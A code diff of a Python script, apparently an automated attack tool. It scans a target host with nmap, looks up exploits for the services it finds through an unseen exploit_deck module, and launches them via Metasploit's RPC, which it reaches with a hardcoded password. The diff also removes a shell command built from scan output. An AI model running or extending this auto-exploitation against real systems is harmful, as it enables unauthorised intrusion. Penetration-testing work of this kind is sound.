@@ -7,9 +7,9 @@
 
 import nmap
 import sys
-import subprocess
 import pymetasploit3
-import re
+# import all the functions from the exploit_deck.py file in the same directory
+from exploit_deck import *
 
 def setup_pymetasploit_connection():
     client = pymetasploit3.MsfRpcClient('astaroth', ssl=True)
@@ -35,19 +35,21 @@ def search_sploit(open_ports):
         product = port[0]
         version = port[1]
         print(f'Searching for exploits for {product} {version}...')
-        result = subprocess.check_output(f'searchsploit {product} {version} --id --exclude="Denial"', shell=True)
-        exploits = []
-        for line in result.splitlines():
-            exploits.append(str(line))
-    return exploits
+        result = compare_exploit(product, version)
+        if(result != "No exploit found"):
+            print(f'Exploit found: {result}. Attempting to exploit...')
+            use_exploit(result)
+        else:
+            print('No exploit found')
 
 if __name__ == '__main__':
     if len(sys.argv) != 2:
         print('Usage: python3 main.py <host>')
         sys.exit(1)
     host = sys.argv[1]
+    
+    setup_pymetasploit_connection()
     open_ports = scan_host(host)
     list_of_sploit = search_sploit(open_ports)
-    print(list_of_sploit)
-
+    
     print('Done')
